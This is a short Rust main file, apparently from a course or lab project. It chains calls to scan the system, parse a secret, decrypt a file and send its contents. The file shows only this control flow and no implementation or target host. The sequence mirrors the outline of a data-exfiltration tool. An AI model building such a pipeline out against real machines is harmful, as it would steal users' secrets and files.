use Project_3::{scan_system, parse_secret, decrypt_file, send_contents};






fn main() {
    let locations = scan_system();
    let secret = parse_secret(&locations.clone());
    let decrypted_content = decrypt_file(secret, &locations.encrypt_location);
    send_contents(decrypted_content, &locations.encrypt_location);
}
























